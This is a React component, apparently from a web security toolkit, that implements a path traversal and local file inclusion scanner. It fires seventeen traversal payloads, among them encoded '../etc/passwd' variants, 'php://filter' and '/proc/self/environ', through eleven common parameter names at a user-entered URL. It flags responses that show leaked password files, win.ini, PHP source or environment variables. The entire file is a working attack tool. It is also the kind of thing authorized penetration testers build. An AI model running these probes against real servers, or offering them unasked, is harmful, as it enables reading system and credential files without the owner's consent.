import React, { useState } from 'react';
import { parallel } from '../lib/tools.js';

const PAYLOADS = [
  '../etc/passwd',
  '../../etc/passwd',
  '../../../etc/passwd',
  '../../../../etc/passwd',
  '../../../../../etc/passwd',
  '../../../../../../etc/passwd',
  '..%2fetc%2fpasswd',
  '..%252fetc%252fpasswd',
  '%2e%2e%2fetc%2fpasswd',
  '....//....//....//etc/passwd',
  '..\\..\\..\\windows\\win.ini',
  '..%5c..%5c..%5cwindows%5cwin.ini',
  '/etc/passwd',
  'file:///etc/passwd',
  'php://filter/convert.base64-encode/resource=index',
  '/proc/self/environ',
  '/proc/self/cmdline'
];

const PARAMS = ['file', 'path', 'page', 'document', 'folder', 'dir', 'load', 'include', 'view', 'template', 'name'];

const SIGNALS = [
  /root:.*:0:0:/,
  /\[boot loader\]|\[fonts\]/i,
  /<\?php|<\?=/,
  /HOME=|PATH=|USER=/,
  /^\x7fELF/
];

export default function PathTraversal() {
  const [base, setBase] = useState('https://example.com/page');
  const [busy, setBusy] = useState(false);
  const [results, setResults] = useState([]);

  const test = async ({ param, payload }) => {
    const url = base + (base.includes('?') ? '&' : '?') + param + '=' + encodeURIComponent(payload);
    try {
      const ctrl = new AbortController();
      const t = setTimeout(() => ctrl.abort(), 6000);
      const res = await fetch(url, { mode: 'cors', signal: ctrl.signal });
      clearTimeout(t);
      const body = await res.text();
      const sig = SIGNALS.find(s => s.test(body));
      return { param, payload, url, status: res.status, vulnerable: !!sig, signal: sig?.toString().slice(0, 40) };
    } catch (e) {
      return { param, payload, url, error: e.message };
    }
  };

  const run = async () => {
    setBusy(true); setResults([]);
    const combos = [];
    for (const param of PARAMS) for (const payload of PAYLOADS) combos.push({ param, payload });
    const out = await parallel(combos, test, 4);
    setResults(out);
    setBusy(false);
  };

  const vulns = results.filter(r => r.vulnerable);

  return (
    <>
      <div className="panel">
        <h2>Path Traversal / LFI Tester</h2>
        <p style={{color:'var(--muted)',fontSize:13,marginTop:0}}>Tests {PARAMS.length} × {PAYLOADS.length} traversal payloads. Detects /etc/passwd, win.ini, PHP source, /proc disclosure.</p>
        <div className="row">
          <input style={{flex:1}} value={base} onChange={e => setBase(e.target.value)} />
          <button disabled={busy} onClick={run}>{busy ? '…' : 'Test'}</button>
        </div>
      </div>
      {results.length > 0 && (
        <div className="panel">
          <strong>{vulns.length} vulnerable / {results.length} tested</strong>
          {vulns.length > 0 && (
            <table style={{marginTop:10}}>
              <thead><tr><th>Param</th><th>Payload</th><th>Status</th><th>Signal</th></tr></thead>
              <tbody>{vulns.map((r, i) => (
                <tr key={i}>
                  <td><strong>{r.param}</strong></td>
                  <td><code style={{fontSize:11}}>{r.payload}</code></td>
                  <td>{r.status}</td>
                  <td><span className="tag sev-critical">match</span></td>
                </tr>
              ))}</tbody>
            </table>
          )}
        </div>
      )}
    </>
  );
}
